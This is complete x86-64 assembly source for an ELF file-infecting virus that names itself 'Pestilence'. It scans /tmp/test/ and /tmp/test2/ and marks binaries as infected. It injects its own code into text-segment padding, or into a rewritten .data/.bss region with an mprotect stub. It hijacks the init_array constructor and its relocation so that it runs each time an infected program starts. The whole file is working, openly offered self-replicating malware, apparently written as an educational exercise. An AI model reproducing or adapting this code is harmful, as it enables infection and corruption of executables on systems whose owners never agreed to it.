BITS 64

%include "defines.s"
virus_len equ _end - _start
virus_lenq equ virus_len / 8
virus_lenb equ virus_len % 8

section .text
    global _start

; [rsp]     cwd_fd
_start:
    push    rbx
    push    r12
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x10
    lea     rdi, [rel cwd]
    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     al, SYS_OPEN
    syscall
    mov     [rsp], eax
    lea     rdi, [rel dir1]
    call    readdir
    lea     rdi, [rel dir2]
    call    readdir
    mov     edi, [rsp]
    xor     eax, eax
    add     al, SYS_FCHDIR
    syscall
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, SYS_CLOSE
    syscall
    leave
    pop     r12
    pop     rbx
    jmp     _end - 5

; [rsp]         fd
; [rsp + 0x4]   buf_len
; [rsp + 0x8]   buffer
; [rsp + 0x10]  index
readdir:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x20
    mov     eax, SYS_CHDIR
    syscall
    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     eax, SYS_OPEN
    syscall
    mov     [rsp], eax

    xor     rdi, rdi
    mov     rsi, 0x1000
    add     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
    xor     r8, r8
    dec     r8
    xor     r9, r9
    xor     eax, eax
    add     al, SYS_MMAP
    syscall
    test    al, al
    jnz     end_readdir
    mov     [rsp + 0x8], rax

loop_dir:
    mov     edi, [rsp]
    mov     rsi, [rsp + 0x8]
    mov     rdx, DIRENT_MAX_SIZE
    xor     eax, eax
    add     al, SYS_GETDENTS64
    syscall
    cmp     eax, 0
    jle     end_readdir
    mov     [rsp + 0x4], eax
    xor     r8, r8
loop_buf_dirent:
    mov     [rsp + 0x10], r8w
    mov     r9, [rsp + 0x8]
    cmp     BYTE [r9 + r8 + d_type], DT_REG
    jne     next_dirent
    lea     rdi, [r9 + r8 + d_name]
    call    infect
next_dirent:
    mov     r9, [rsp + 0x8]
    movzx   r8, WORD [rsp + 0x10]
    add     r8w, [r9 + r8 + d_reclen]
    cmp     r8w, [rsp + 4]
    jl      loop_buf_dirent
    jmp     loop_dir
end_readdir:
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, SYS_CLOSE
    syscall
    leave
    ret

infect:
    push    rbp
    mov     rbp, rsp
    sub     rsp, STACK_FRAME_SIZE + 0x10 ; Let's be cautious 
    mov     [rsp + filename], rdi

    mov     esi, O_RDWR
    xor     eax, eax ; SYS_OPEN = 0
    syscall
    test    eax, eax
    js      quit_infect

    mov     [rsp + fd], eax
    mov     edi, [rsp + fd]
    lea     rsi, [rsp + e_hdr]
    mov     rdx, ELFHDR_SIZE
    mov     eax, SYS_READ
    syscall

    lea     rbx, [rsp + e_hdr]
    lea     rax, [rbx + e_ident]
    cmp     [rax], DWORD ELF_MAGIC
    jne     close_quit_infect
    cmp     [rax + EI_CLASS], BYTE ELFCLASS64
    jne     close_quit_infect
    cmp     [rax + EI_DATA], BYTE ELFDATA2LSB
    jne     close_quit_infect
    cmp     [rax + EI_PAD], DWORD INFECTION_MAGIC
    je      close_quit_infect
    mov     rdx, [rax + e_phnum]
    test    rdx, rdx
    je      close_quit_infect
    mov     rdx, [rax + e_shnum]
    test    rdx, rdx
    je      close_quit_infect
    mov     ax, [rbx + e_type]
    cmp     ax, ET_EXEC
    je      right_type_check
    cmp     ax, ET_DYN
    jne     close_quit_infect

right_type_check:
    mov     edi, [rsp + fd]
    xor     rsi, rsi
    mov     rdx, SEEK_END
    mov     eax, SYS_LSEEK
    syscall
    mov     [rsp + file_size], rax
    mov     rsi, rax
    xor     rdi, rdi
    mov     rdx, PROT_READ | PROT_WRITE
    mov     r10, MAP_SHARED
    mov     r8d, [rsp + fd]
    xor     r9, r9
    mov     eax, SYS_MMAP
    syscall
    test    al, al
    jnz     close_quit_infect
    mov     [rsp + map], rax

    mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; mark binary for infection

    mov     r8, rax
    add     r8, [rax + e_phoff]
    movzx   rcx, WORD [rax + e_phnum]
loop_phdrs:
    mov     r9, r8
    sub     r9, [rsp + map]
    cmp     [r8 + p_type], DWORD PT_LOAD
    jne     next_phdr
    cmp     [r8 + p_flags], DWORD PF_R | PF_X
    jne     comp_data
save_text_infos:
    mov     [rsp + text_phdr_off], r9
    mov     rdx, QWORD [r8 + p_filesz]
    mov     [rsp + old_text_size], rdx
comp_data:
    cmp     [r8 + p_flags], DWORD PF_R | PF_W
    jne     next_phdr
save_data_infos:
    mov     [rsp + data_phdr_off], r9
next_phdr:
    add     r8w, [rax + e_phentsize]
    loop    loop_phdrs

loop_sections:  ; We loop from the end of the section table to get 
                ; the init_array content before reaching the rela.dyn section
    mov     rbx, [rsp + map]
    movzx   rax, WORD [rbx + e_shnum]
    movzx   rcx, WORD [rbx + e_shentsize]
    mul     rcx
    add     rax, [rbx + e_shoff]
    add     rax, rbx
    mov     rdx, [rsp + text_phdr_off]
    add     rdx, [rsp + map]
    mov     rdx, [rdx + p_offset]
    add     rdx, QWORD [rsp + old_text_size]
    mov     cx, WORD [rbx + e_shnum]

test_last_text:
    sub     ax, WORD [rbx + e_shentsize]
    mov     r9, QWORD [rax + sh_offset]
    add     r9, QWORD [rax + sh_size]
    cmp     r9, rdx
    jne     test_init_array
    mov     QWORD [rsp + last_text_shdr_off], rax
    sub     QWORD [rsp + last_text_shdr_off], rbx
test_init_array:
    mov     r9d, [rax + sh_type]
    cmp     r9d, SHT_INIT_ARRAY
    jne     test_bss
    mov     QWORD [rsp + init_array_shdr_off], rax
    sub     QWORD [rsp + init_array_shdr_off], rbx
test_bss:
    cmp     r9d, SHT_NOBITS
    jne     test_rela
    test    QWORD [rax + sh_flags], SHF_TLS
    jnz     test_rela
    mov     QWORD [rsp + bss_shdr_off], rax
    sub     QWORD [rsp + bss_shdr_off], rbx
test_rela:
    cmp     r9d, SHT_RELA
    je      get_init_rela
next_section:
    loop    test_last_text
    jmp     check_text_padding

get_init_rela:
    mov     r8, [rsp + map]
    mov     r10, [rsp + init_array_shdr_off]
    add     r10, r8
    add     r8, [r10 + sh_offset]
    mov     r8, [r8]
    mov     QWORD [rsp + old_init_func], r8
    mov     r10, [r10 + sh_addr]
    mov     r11, [rsp + map]
    add     r11, [rax + sh_offset]
    mov     r12, r11
    add     r12, [rax + sh_size]
loop_rela:
    cmp     r10, [r11 + r_offset]
    je      found_init_rela
    add     r11, RELA_SIZE
    cmp     r11, r12
    jl      loop_rela
    jmp     next_section
found_init_rela:
    mov     QWORD [rsp + init_rela_entry_off], r11
    sub     QWORD [rsp + init_rela_entry_off], rbx
    jmp     next_section

check_text_padding:
    mov     r8, [rsp + map]
    mov     r9, r8
    add     r9w, WORD [r8 + e_phentsize]
    add     r8, [rsp + text_phdr_off]
    add     r9, [rsp + text_phdr_off]
    mov     rbx, [r8 + p_offset]
    add     rbx, [r8 + p_filesz]
    mov     rax, [r9 + p_offset]
    sub     rax, rbx
    cmp     rax, virus_len
    jle     remap_and_infect_data

    mov     rax, r8
    mov     rdi, [rax + p_offset]
    add     rdi, [rax + p_filesz]
    mov     rsi, [rax + p_vaddr]
    add     rsi, [rax + p_memsz]
    mov     [rsp + payload_base_address], rsi
    mov     [rsp + payload_base_offset], rdi
    add     rdi, [rsp + map]
    lea     rsi, [rel _start]
    mov     rcx, virus_lenq
    call    copy_payload

increase_text_size:
    mov     rax, [rsp + text_phdr_off]
    add     rax, [rsp + map]
    add     QWORD [rax + p_filesz], virus_len
    add     QWORD [rax + p_memsz], virus_len
    mov     rax, [rsp + map]
    add     rax, [rsp + last_text_shdr_off]
    add     QWORD [rax + sh_size], virus_len
    mov     rdi, [rsp + payload_base_offset]
    mov     rsi, [rsp + payload_base_address]
    jmp     hijack_constructor

remap_and_infect_data:
    cmp     rax, payload_mprotect_len
    jle     munmap_quit_infect

    mov     edi, DWORD [rsp + fd]
    mov     rax, [rsp + map]
    add     rax, [rsp + bss_shdr_off]
    mov     rsi, [rsp + file_size]
    add     rsi, [rax + sh_size]
    add     rsi, virus_len
    mov     QWORD [rsp + new_file_size], rsi
    mov     eax, SYS_FTRUNCATE
    syscall
    test    eax, eax
    jnz     munmap_quit_infect

    mov     rdi, [rsp + map]
    mov     rsi, [rsp + file_size]
    mov     rdx, [rsp + new_file_size]
    xor     r10, r10
    add     r10b, MREMAP_MAYMOVE
    mov     eax, SYS_MREMAP
    syscall
    cmp     rax, 0xffffffffffffff00
    ja      munmap_quit_infect
    mov     [rsp + map], rax

shift_end_of_file:
    mov     rdi, [rsp + new_file_size]
    mov     rsi, [rsp + file_size]
    mov     rcx, rsi
    add     rdi, rax
    add     rsi, rax
    add     rax, [rsp + bss_shdr_off]
    sub     rcx, [rax + sh_offset]
    inc     rcx
    std
memccpy_file: ; We copy the file from the end because destination and sources are overlapping
    lodsb
    stosb
    loop    memccpy_file
    cld

update_offsets_everywhere:
    mov     r9, [rsp + new_file_size]
    sub     r9, [rsp + file_size]
    add     [rsp + bss_shdr_off], r9
    add     [rsp + last_text_shdr_off], r9
    add     [rsp + init_array_shdr_off], r9
    mov     rax, [rsp + map]
    add     [rax + e_shoff], r9
    mov     rcx, [rsp + bss_shdr_off]
    sub     rcx, [rax + e_shoff]
    mov     bx, [rax + e_shnum]
    movzx   r8, WORD [rax + e_shentsize]
    mov     rax, rcx
    cqo
    div     r8
    movzx   rcx, bx
    sub     rcx, rax
    mov     rax, [rsp + map]
    add     rax, [rsp + bss_shdr_off]
    add     rax, r8
shift_last_sections:
    add     [rax + sh_offset], r9
    add     rax, r8
    loop    shift_last_sections

update_sizes:
    mov     rax, [rsp + map]
    mov     rbx, rax
    add     rax, [rsp + bss_shdr_off]
    mov     r10, [rax + sh_size]
    add     rbx, [rsp + data_phdr_off]
    add     QWORD [rbx + p_filesz], virus_len
    add     [rbx + p_filesz], r10
    add     QWORD [rbx + p_memsz], virus_len
    mov     r12, [rbx + p_memsz]
    sub     r12, [rbx + p_filesz]
    add     QWORD [rax + sh_size], virus_len
    mov     DWORD [rax + sh_type], SHT_PROGBITS

    mov     rdx, rax
    mov     rdi, [rsp + map]
    add     rdi, [rdx + sh_offset]
    mov     rcx, r10
write_bss:
    xor     al, al
    stosb
    loop    write_bss

copy_virus_in_data:
    mov     rdi, [rsp + map]
    add     rdi, [rdx + sh_offset]
    add     rdi, r10
    lea     rsi, [rel _start]
    mov     rcx, virus_lenq
    call    copy_payload

    mov     rax, [rsp + map]
    add     rax, [rsp + bss_shdr_off]
    mov     rdx, [rax + sh_offset]
    add     rdx, r10
    mov     [rsp + payload_data_base_offset], rdx
    mov     rdx, [rax + sh_addr]
    add     rdx, r10
    sub     rdx, r12
    mov     [rsp + payload_data_base_address], rdx

format_text_code_chunk:
    mov     rbx, [rsp + map]
    add     rbx, [rsp + data_phdr_off]
    mov     r8, [rbx + p_vaddr]
    mov     rax, r8
    cqo
    mov     r9, QWORD 0x1000
    div     r9
    sub     r8, rdx
    mov     rcx, [rbx + p_filesz]
    add     rcx, rdx
    mov     [data_len], rcx
    mov     rbx, [rsp + map]
    add     rbx, [rsp + text_phdr_off]
    mov     rax, [rbx + p_vaddr]
    add     rax, [rbx + p_memsz]
    mov     [rsp + payload_base_address], rax
    sub     r8, rax
    mov     [data_addr_offset], r8

    lea     rsi, [rel payload_mprotect]
    mov     rax, [rsp + map]
    add     rax, [rsp + text_phdr_off]
    mov     rdi, [rax + p_offset]
    add     rdi, [rax + p_filesz]
    mov     [rsp + payload_base_offset], rdi
    add     rdi, [rsp + map]
    mov     rcx, payload_mprotect_len
copy_text_code_chunk:
    lodsb
    stosb
    loop    copy_text_code_chunk

    mov     rbx, [rsp + map]
    mov     rax, rbx
    add     rax, [rsp + text_phdr_off]
    add     QWORD [rax + p_filesz], payload_mprotect_len
    add     QWORD [rax + p_memsz], payload_mprotect_len
    add     rbx, [rsp + last_text_shdr_off]
    add     QWORD [rbx + sh_size], payload_mprotect_len

    mov     rdx, [rsp + new_file_size]
    mov     [rsp + file_size], rdx
    mov     rdi, [rsp + payload_data_base_offset]
    mov     rsi, [rsp + payload_data_base_address]

; rdi       payload_base_offset
; rsi       payload_base_address
hijack_constructor:
    mov     rax, [rsp + map]
    mov     rbx, rax
    add     rbx, [rsp + init_array_shdr_off]
    add     rax, [rbx + sh_offset]
    mov     rdx, [rsp + payload_base_address]
    mov     [rax], rdx
    mov     r11, [rsp + map]
    add     r11, [rsp + init_rela_entry_off]
    mov     [r11 + r_addend], rdx
    add     rdi, [rsp + map]
    add     rdi, virus_len - 4
    mov     rdx, [rsp + old_init_func]
    add     rsi, virus_len
    sub     rdx, rsi
    mov     DWORD [rdi], edx

munmap_quit_infect:
    mov     rdi, [rsp + map]
    mov     rsi, [rsp + file_size]
    mov     eax, SYS_MSYNC
    syscall

    mov     rdi, [rsp + map]
    mov     rsi, [rsp + file_size]
    mov     eax, SYS_MUNMAP
    syscall

close_quit_infect:
    mov     edi, [rsp + fd]
    mov     eax, SYS_CLOSE
    syscall
quit_infect:
    leave
    ret

copy_payload:
    lodsq
    stosq
    loop    copy_payload
    mov     cx, virus_lenb
    test    cx, cx
    jz      end_copy
copy_last_bytes:
    lodsb
    stosb
    loop    copy_last_bytes
end_copy:
    ret

payload_mprotect:
    lea     rdi, [rel payload_mprotect]
    add     rdi, [rel data_addr_offset]
    mov     rsi, [rel data_len]
    mov     rdx, PROT_READ | PROT_WRITE | PROT_EXEC
    xor     rax, rax
    add     rax, SYS_MPROTECT
    syscall
    lea     rax, [rel payload_mprotect]
    add     rax, [rel data_addr_offset]
    add     rax, [rel data_len]
    sub     rax, virus_len
    jmp     rax
    data_len: dq 0
    data_addr_offset: dq 0

    payload_mprotect_len: equ $ - payload_mprotect
    dir1: db "/tmp/test/", 0
    dir2: db "/tmp/test2/", 0
    cwd: db ".", 0
    signature: db "Pestilence version 1.0 (c)oded by alagroy-", 0
    data_tmp_text: db "Remapping and infecting .data", 10
        .len: equ $ - data_tmp_text
    ; TIMES 0x4000 db 0 ; To trigger data infection for testing, will be removed eventuelly
    final_jump: db 0xe9, 0, 0, 0, 0

_end:
    xor     rdi, rdi
    mov     eax, SYS_EXIT
    syscall